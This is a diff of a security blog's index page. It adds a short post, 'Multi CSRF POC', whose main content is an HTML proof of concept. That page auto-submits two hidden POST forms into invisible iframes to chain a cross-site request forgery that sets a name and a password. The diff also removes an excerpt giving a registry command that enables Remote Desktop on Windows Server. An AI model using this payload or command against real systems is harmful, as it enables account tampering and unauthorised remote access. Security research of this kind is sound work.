@@ -164,7 +164,7 @@
       <span class="logo-line-after"><i></i></span>
     </a>
   </div>
-  <p class="site-subtitle">blog</p>
+  <p class="site-subtitle"></p>
 </div>
 
 <div class="site-nav-toggle">
@@ -253,6 +253,126 @@
           <div id="content" class="content">
             
   <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/05/31/Multi-CSRF-POC/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="xl7dev">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="xl7dev">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/05/31/Multi-CSRF-POC/" itemprop="url">
+                  Multi CSRF POC
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-05-31T17:43:35+08:00">
+                2016-05-31
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="CSRF-POC"><a href="#CSRF-POC" class="headerlink" title="CSRF POC"></a>CSRF POC</h3><blockquote>
+<p>请求两次CSRF达到最终效果，POST–&gt;first.php–&gt;second.php</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;form1&quot; target=&apos;csrfIframe1&apos; action=&quot;http://blog.safebuff.com/first.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;小乐天&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;form id=&quot;form2&quot; target=&apos;csrfIframe2&apos; action=&quot;http://blog.safebuff.com/second.php&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;sec&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.onload = function() &#123;</span><br><span class="line">        document.getElementById(&quot;form1&quot;).submit();</span><br><span class="line"> 	    document.getElementById(&quot;form2&quot;).submit();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;iframe style=&quot;display: hidden&quot; height=&quot;0&quot; width=&quot;0&quot; frameborder=&quot;0&quot; name=&quot;csrfIframe1&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe style=&quot;display: hidden&quot; height=&quot;0&quot; width=&quot;0&quot; frameborder=&quot;0&quot; name=&quot;csrfIframe2&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
     
       
 
@@ -1353,128 +1473,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/05/15/Windows-Server-How-to-Open-Remote-DeskTop-CMD/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/05/15/Windows-Server-How-to-Open-Remote-DeskTop-CMD/" itemprop="url">
-                  Windows Server How to Open Remote DeskTop CMD
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-05-15T14:21:04+08:00">
-                2016-05-15
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h3 id="Win2003-Server"><a href="#Win2003-Server" class="headerlink" title="Win2003 Server"></a>Win2003 Server</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
-<h3 id="Win2008-2012-Server"><a href="#Win2008-2012-Server" class="headerlink" title="Win2008/2012 Server"></a>Win2008/2012 Server</h3>
-          <!--noindex-->
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/05/15/Windows-Server-How-to-Open-Remote-DeskTop-CMD/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1520,7 +1518,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">72</span>
+              <span class="site-state-item-count">73</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -1530,7 +1528,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
